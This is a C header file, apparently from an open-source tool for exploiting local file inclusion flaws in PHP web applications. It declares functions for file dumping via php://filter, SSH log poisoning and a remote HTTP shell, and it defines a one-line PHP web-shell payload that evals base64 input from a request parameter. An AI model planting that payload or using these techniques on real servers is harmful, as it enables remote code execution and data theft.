#ifndef KAD_XPL
#define KAD_XPL

#include <stdio.h>
#include <unistd.h>
#include <libssh/libssh.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#ifdef __APPLE__
    #include <sys/uio.h>
#else
    #include <sys/io.h>
#endif
#include <sys/mman.h>

#include "kadimus_request.h"
#include "memory/alloc.h"
#include "kadimus_str.h"
#include "output.h"
#include "regex/pcre.h"
#include "io/utils.h"

#include "kadimus.h"

typedef enum {
    INPUT = 1,
    ENVIRON,
    AUTH,
    DATA
} rce_type;

#define FILTER_WRAP "php://filter/convert.base64-encode/resource="
#define DATA_WRAP "data://text/plain;base64,"
#define ERROR_FILE "./resource/errors.txt"
#define CHECK_FILES "./resource/common_files.txt"
#define AUTH_LOG_REGEX "^(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s+\\d+ \\d+:\\d+:\\d+.*sshd\\[\\d+\\]:.+$"
#define STAIRWAY2HEAVEN "<?php eval(\"?>\".base64_decode($_REQUEST['stairway_to_heaven'])); exit(0); ?>"

#define DATAWRAPLEN (sizeof(DATA_WRAP)-1)

int is_dynamic(const char *url);
int common_error_check(const char *uri);
void phpfilter_dumpfile(FILE *out, const char *target, const char *filename, const char *pname);
void scan(const char *target_uri);
void scan_list(struct kadimus_opts *opts);
void rce_http_shell(const char *url, const char *parameter, int technique);
void exec_phpcode(const char *url, const char *parameter, const char *code, int type);
void *thread_scan(void *url);
bool ssh_log_poison(const char *target, int port);
bool check_auth_poison(const char *target);

#endif
